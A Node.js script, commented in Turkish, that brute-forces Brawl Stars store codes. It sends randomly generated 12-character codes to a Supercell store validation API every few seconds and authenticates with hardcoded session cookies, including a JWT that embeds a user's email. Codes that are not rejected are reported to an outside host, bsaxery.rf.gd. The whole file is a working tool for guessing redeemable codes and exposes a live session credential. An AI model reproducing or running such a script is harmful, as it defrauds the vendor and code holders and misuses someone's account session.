const axios = require("axios");
const fs = require("fs");
const express = require("express");

const app = express();
let port = 8080; // Başlangıçta 8080 portunu deneyelim

// Express ile web sunucusu oluştur
app.use(express.static("public"));
app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});

// Rastgele 12 Haneli Kod Üretici
function generateCode() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let code = "";
    for (let i = 0; i < 12; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// Cookie JSON'ini string formatına çevir
const cookies = [
    {
        "name": "OptanonConsent",
        "value": "isGpcEnabled=0&datestamp=Thu+Nov+21+2024+16%3A33%3A10+GMT%2B0300+(GMT%2B03%3A00)&version=202401.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&genVendors=V4%3A0%2CV1%3A0%2CV2%3A0%2CV3%3A0%2C&consentId=cab731ca-a4df-4f8c-89f4-c556a952dedd&interactionCount=2&landingPath=NotLandingPage&groups=C0004%3A1%2CC0002%3A1%2CC0001%3A1&geolocation=TR%3B07&AwaitingReconsent=false",
        "domain": ".supercell.com",
        "path": "/"
    },
    {
        "name": "OptanonAlertBoxClosed",
        "value": "2024-11-21T13:32:26.146Z",
        "domain": ".supercell.com",
        "path": "/"
    },
    {
        "name": "sp",
        "value": "a62f2ae3-9bbd-4212-a12f-62e5ff904130",
        "domain": ".supercell.com",
        "path": "/"
    },
    {
        "name": "SESSION_COOKIE",
        "value": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijc4LTZjNmE2ZWFkLTkzMDQtNDJlNi1hZWRkLTFlZjkxYTA4YzMwMyIsImVtYWlsIjoiZWZldDc0NjRAZ21haWwuY29tIiwiaWF0IjoxNzMyMTk1OTg5LCJleHAiOjE3MzIxOTk1ODl9.EM1TARuws_7ldsvIF-bWiGfiFuMmjhpk3FZ3c0KbSt8",
        "domain": ".store.supercell.com",
        "path": "/"
    }
    // Ek cookie'leri buraya ekleyin...
];

// Cookie stringini oluştur
const cookieString = cookies
    .map(cookie => `${cookie.name}=${cookie.value}`)
    .join("; ");

// Kod Üret ve Kontrol Et
async function validateAndNotifyCode() {
    let code;

    // Kod üretilirken bot.txt içinde olup olmadığını kontrol et
    do {
        code = generateCode();
    } while (fs.existsSync("bot.txt") && fs.readFileSync("bot.txt", "utf8").includes(code));

    const url = `https://store.supercell.com/api/v3/brawlstars/store-codes/${code}/validate`;

    try {
        const response = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10;K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 MobileSafari/537.36",
                "Cookie": cookieString
            }
        });

        // Yanıtı işle
        const responseString = JSON.stringify(response.data);
        const { valid } = response.data;

        console.log(`Kod: ${code}, Yanıt: ${responseString}`);

        // valid false dışında her durumda API'ye bildir
        if (valid !== false) {
            const notifyUrl = `http://bsaxery.rf.gd/code.php?code=${code}&valid=${valid}&print=${encodeURIComponent(responseString)}`;
            try {
                const notifyResponse = await axios.get(notifyUrl);
                console.log("Bildirim gönderildi:", notifyResponse.data);
            } catch (notifyError) {
                console.error("Bildirim gönderim hatası:", notifyError.message);
            }
        }

        // Eğer valid false ise bot.txt'ye boş satır aralıkla yaz
        if (valid === false) {
            fs.appendFileSync("bot.txt", `${code}\n\n`, "utf8");
        }
    } catch (error) {
        console.error("İstek hatası:", error.message);
    }
}

// Sürekli Kod Üret ve Kontrol Et (Her 8 saniyede bir)
setInterval(validateAndNotifyCode, 7000); // Her 8 saniyede bir yeni kod dene

// Portları sırasıyla deneme fonksiyonu
function tryPorts(startPort) {
    return new Promise((resolve, reject) => {
        const checkPort = (port) => {
            const server = app.listen(port, () => {
                resolve(port);
                server.close(); // Başarılı port bulundu, sunucuyu kapatıyoruz
            }).on('error', (err) => {
                if (err.code === 'EADDRINUSE') {
                    console.log(`Port ${port} zaten kullanımda, bir sonraki portu deniyorum...`);
                    checkPort(port + 1); // Portu kullanılamıyorsa bir sonraki portu dene
                } else {
                    reject(err); // Diğer hata durumları
                }
            });
        };
        checkPort(startPort); // İlk portu deneyerek başla
    });
}

// Uygulama başlatma ve port denemesi
async function startServer() {
    try {
        const availablePort = await tryPorts(8080); // Başlangıçta 8080 portunu dene
        app.listen(availablePort, () => {
            console.log(`Sunucu ${availablePort} portunda başlatıldı`);
        });
    } catch (err) {
        console.error("Sunucu başlatılırken hata oluştu:", err.message);
    }
}

// İlk sunucu başlatma denemesi
startServer();
